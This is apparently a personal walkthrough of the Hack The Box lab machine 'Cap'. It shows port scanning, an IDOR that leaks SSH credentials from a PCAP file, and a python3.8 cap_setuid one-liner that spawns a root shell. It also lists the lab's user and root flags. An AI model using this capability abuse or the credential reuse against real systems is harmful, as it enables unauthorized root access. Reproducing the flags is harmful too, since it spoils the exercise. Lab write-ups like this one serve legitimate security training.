# Cap — Hack The Box

* **OS:** Linux
* **Difficulty:** Easy
* **Date:** September 2026
* **Focus:** Manual Enumeration & Logic Testing


**Reconnaissance and Port Scanning**

nmap --top-ports 100 -sV -sC ***IP*** -oN ***outputFileName***
Host is up (0.16s latency).
Not shown: 97 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 fa:80:a9:b2:ca:3b:88:69:a4:28:9e:39:0d:27:d5:75 (RSA)
|   256 96:d8:f8:e3:e8:f7:71:36:c5:49:d5:9d:b6:a4:c9:0c (ECDSA)
|_  256 3f:d0:ff:91:eb:3b:f6:e1:9f:2e:8d:de:b3:de:b2:18 (ED25519)
80/tcp open  http    Gunicorn
|_http-title: Security Dashboard
|_http-server-header: gunicorn
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

- Based on this info can conclude there is a website
- FTP anon login session - Did not work must check website for vulns
	- ftp IP
- SSH not useful right now.

Website:
- Most of the buttons just display command outputs for your ip, however Security Snapshot seems too have a number in the url which could lead too an IDOR as you can download a pcap file
- Mine started at 1 keeps on going up will see what 1 and 0 contains

**Vulnerability Analysis**
PCAP files downloaded:
- User: nathan
- Password: Buck3tH4TF0RM3!

Will first test if this password is the ssh password for this user
ssh nathan@10.129.130.221
worked 
- User txt is in this file:
	- ef2f7e42bd2ad6600b38f8a5c8b5e744

**Post-Exploitation Privilege Escalation**
- sudo -l
	- No access
- getcap -r / 2>/dev/null
	/usr/bin/python3.8 = cap_setuid,cap_net_bind_service+eip
	/usr/bin/ping = cap_net_raw+ep
	/usr/bin/traceroute6.iputils = cap_net_raw+ep
	/usr/bin/mtr-packet = cap_net_raw+ep
- find / -perm -4000 -type f 2>/dev/null
		/usr/bin/umount
		/usr/bin/newgrp
		/usr/bin/pkexec
		/usr/bin/mount
		/usr/bin/gpasswd
		/usr/bin/passwd
		/usr/bin/chfn
		/usr/bin/sudo
		/usr/bin/at
		/usr/bin/chsh
		/usr/bin/su
		/usr/bin/fusermount
		/usr/lib/policykit-1/polkit-agent-helper-1
		/usr/lib/snapd/snap-confine
		/usr/lib/openssh/ssh-keysign
		/usr/lib/dbus-1.0/dbus-daemon-launch-helper
		/usr/lib/eject/dmcrypt-get-device
		/snap/snapd/11841/usr/lib/snapd/snap-confine
		/snap/snapd/12398/usr/lib/snapd/snap-confine
		/snap/core18/2066/bin/mount
		/snap/core18/2066/bin/ping
		/snap/core18/2066/bin/su
		/snap/core18/2066/bin/umount
		/snap/core18/2066/usr/bin/chfn
		/snap/core18/2066/usr/bin/chsh
		/snap/core18/2066/usr/bin/gpasswd
		/snap/core18/2066/usr/bin/newgrp
		/snap/core18/2066/usr/bin/passwd
		/snap/core18/2066/usr/bin/sudo
		/snap/core18/2066/usr/lib/dbus-1.0/dbus-daemon-launch-helper
		/snap/core18/2066/usr/lib/openssh/ssh-keysign
		/snap/core18/2074/bin/mount
		/snap/core18/2074/bin/ping
		/snap/core18/2074/bin/su
		/snap/core18/2074/bin/umount
		/snap/core18/2074/usr/bin/chfn
		/snap/core18/2074/usr/bin/chsh
		/snap/core18/2074/usr/bin/gpasswd
		/snap/core18/2074/usr/bin/newgrp
		/snap/core18/2074/usr/bin/passwd
		/snap/core18/2074/usr/bin/sudo
		/snap/core18/2074/usr/lib/dbus-1.0/dbus-daemon-launch-helper
		/snap/core18/2074/usr/lib/openssh/ssh-keysign

- Important issue found that can be exploited sudo python 3.8
	- /usr/bin/python3.8 -c 'import os; os.setuid(0); os.system("/bin/bash")'

- cat /root/root.txt 
	- e5d3815c9a67ebbc47da7faf0fb8b7f0


The Flow of CAP

	- Gathering of information basic info like a nmap scan too find the ports and how the web page operates where there could be a vulnerability 
	- You'll discover a IDOR in the Security Snapshot (5 Second PCAP + Analysis) due to it not actually starting from 1 but rather 0
	- Downloading this PCAP file of 0 will give you a username and password, and the only useful place too use it would be SSH
	- This is indeed the SSH details thus it would allow you to login no problem and the user flag is gotten right in the folder your shell spawns in.
	- You'll then do the routine commands no need for linpeas, basic access checking commands and you'll see python had the following attribute set too it: cap_setuid
	- This allows you to get sudo by setting it to 0 as user ID 0 is root
	- Then from there you can just easily go pickup the root flag in the root folder
